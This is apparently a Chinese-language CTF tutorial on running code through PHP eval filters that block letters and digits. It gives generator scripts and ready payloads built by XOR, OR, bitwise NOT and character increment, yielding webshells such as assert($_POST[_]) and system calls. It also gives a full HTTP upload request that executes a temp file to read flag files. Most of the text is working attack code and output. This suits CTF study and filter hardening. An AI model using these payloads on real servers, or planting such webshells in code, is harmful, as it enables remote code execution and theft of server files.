[TOC]



### 命令执行-无字母数字webshell

我们看如下代码：

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
```

在命令执行中，我们经常会碰到过滤了字母和数字的情况，那如何才能绕过呢？

我的想法：通过非字母数字来进行一些相关的操作得到我们想要的代码，如：`system('ls');`

我们可以通过一些特殊的字符来得到：^(异或) ~(取反) +(自增)  |(或)



#### 1、异或

我们先看如下代码：

```php
<?php
    echo "5"^"Z";
```

输出: `o`

我们先来分析一下：字符 "5" 的ascii码是53，其二进制是110101，字母Z的ascii码是90，二进制是1011010

对照一下：

```php
0110101
1011010
异或：相同为0，不同为1
1101111
```

异或可得：1101111，转为10进制为 111 ，ascii码为：o

我们举个例子：

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```



我们可以使用如下异或脚本：

```php
// rce_xor.php
<?php

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)^urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);

```



```python
# -*- coding: utf-8 -*-
# rce_xor.py

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("xor_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"^\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)

```

使用方法：

首先我们先在php脚本中修改正则过滤的表达式，`$preg` 运行一下php脚本，会生成一个txt文件

（其中包含了由哪些字符异或可以产生我们想要的结果）然后我们再运行python脚本，输入函数，以及命令即可。

例如：

```cmd
D:\xxx\scripts>python rce_xor.py

[+] your function：system
[+] your command：ls
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");
```

就生成了一个我们想要的字符串（因为存在一些不可打印字符，所以经过了url编码）



#### 2、或

原理类似，脚本改动一下就行：

rec_or.php:

```php
<?php

/* author yu22x */

$myfile = fopen("or_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

python:

```python
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("or_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

运行结果：

```cmd
D:\xxx\scripts>python rce_or.py
[+] your function：system
[+] your command：cat f*
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%00"|"%60%60%60%20%60%2a");
```







#### 3、取反

我们知道，对一个字符进行两次取反，会得到原来的值，我们可以利用这个特性进行突破



脚本：

```php
<?php
//在命令行中运行
// 取反
// 无数字字母getshell

while(true) {
    fwrite(STDOUT,PHP_EOL.'[+]your function: ');
    $system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
    fwrite(STDOUT,PHP_EOL.'\n[+]your command: ');
    $command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
    echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';   //两次取反可得到原结果
}
```

原理：我们通过将输入的字符进行取反，一般转化为不可见的字符，不会触发正则表达式，所以可以绕过，然后将其使用url编码后，再拼接上取反符号 `~` 这样执行，就相当于原来输入的shell了

例如：

```php
<?php
    $s1 = "phpinfo";
    $s1 = urlencode(~$s1);
    echo $s1.PHP_EOL;
    $s2 = ~urldecode($s1);
    echo $s2.PHP_EOL;
    $shell = $s1;
    echo "shell: "."(~".$shell.")();";
```

输出：

```php
%8F%97%8F%96%91%99%90
phpinfo
shell: (~%8F%97%8F%96%91%99%90)();
```

此处，phpinfo 经过两次取反后还是为 phpinfo

我们将 第一次取反后的编码与 `(~`   `)();` 进行拼接

得到shell:

```php
(~%8F%97%8F%96%91%99%90)();  // phpinfo();
```







#### 4、自增

```
"A"++ ==> "B"
"B"++ ==> "C"
```

如上，我们如果拿到了 字母A，那我们就可以通过++ 自增，获取所有大写字母

那么问题就是，我们如何才能够获得大写字母A呢？

> 在php中，如果强制连接字符串和数组的话，数组将被转化为字符串，其值为 “Array”

```php
<?php
	$a = ''.[];
	var_dump($a);    // 输出: String(5) "Array"
```

根据以上知识点，我们只需取第一个字母，就可以获得大写字母 A 了 （也可以获得小写字母a）

```php
<?php
    $s = "Array";
    echo $s[$_];  //输出：A  我们没有定义 $_ 但是php默认赋值NULL==0
	$_++;
    echo $s[$_];  //输出：r
```



>
>  $++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,**通过对未定义变量的自增操作来得到一个数字** 
>




故有payload:

php5

```php
<?php
$_=[].'';   //得到"Array"
$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__ = $___;   //$__="A"
$_ = $___;   //$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$___ .= $__;   //$___="AS"
$___ .= $__;   //$___="ASS"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
$___ .= $__;   //$___="ASSE"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
$___ .= $__;   //$___="ASSER"
$__++;$__++;   //得到"T"，此时$__="T"
$___ .= $__;   //$___="ASSERT"
$__ = $_;   //$__="A"
$____ = "_";   //$____="_"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
$____ .= $__;   //$____="_P"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
$____ .= $__;   //$____="_PO"
$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$____ .= $__;   //$____="_POS"
$__++;   //得到"T"，此时$__="T"
$____ .= $__;   //$____="_POST"
$_ = $$____;   //$_=$_POST
$___($_[_]);   //ASSERT($POST[_])
```



####  5、上传临时文件

##### 知识点：

> 1、Linux下可用点 . 来执行shell脚本，等同于 source 
>
> 2、Linux文件名可以使用glob通配符匹配
>
> - `*`可以代替0个及以上任意字符
> - `?`可以代表1个任意字符
>
> 3、PHP中POST上传文件会把我们上传的文件暂时存在/tmp文件夹中，默认文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。

假如我们要执行上传的shell文件，尝试如下：

```shell
. /???/?????????
```

但是我们会发现这样(通常情况下)并不能争取的执行文件，而是会报错，原因就是这样匹配到的文件太多了，系统不知道要执行哪个文件。

但是我们可以使用如下payload：

```shell
. /???/????????[@-[]
```

最后的`[@-[]`表示ASCII在 @ 和 [ 之间的字符，也就是大写字母，所以最后会执行的文件是tmp文件夹下结尾是大写字母的文件。由于PHP生成的tmp文件最后一位是随机的大小写字母，所以我们可能需要多试几次才能正确的执行我们的代码。(50%的几率嘛)

<img src="https://s2.loli.net/2022/12/26/mO6f8C4XEW73SrH.png" alt="img" style="zoom: 50%;" />

因此，我们可以：

```php
POST /?cmd=.+/???/????????[@-[] HTTP/1.1
Host: xxx.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------5642920497686823912130808832
Connection: close
Cookie: UM_distinctid=17424c95164f2-06a0a787df53968-4c302273-144000-17424c9516533d
Upgrade-Insecure-Requests: 1
Content-Length: 291
​
-----------------------------5642920497686823912130808832
Content-Disposition: form-data; name="fileUpload"; filename="dd.txt"
Content-Type: text/plain
​
#! /bin/sh
system('cat /f*');
-----------------------------5642920497686823912130808832--
```

自己构造网页，上传带有shell命令的文件到服务器，并抓包，修改参数为 `.%20/???/????????[@-]]`

这样就可以执行了（注意是在同一个数据包，否则tmp临时文件被删除）





ctfshow-web55可用上述解法





#### 参考文章

[yu师傅-rce脚本](https://blog.csdn.net/miuzzx/article/details/109143413)

[无字母数字webshell总结-先知社区](https://xz.aliyun.com/t/8107#toc-0)

[p神-一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

[p神-无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list)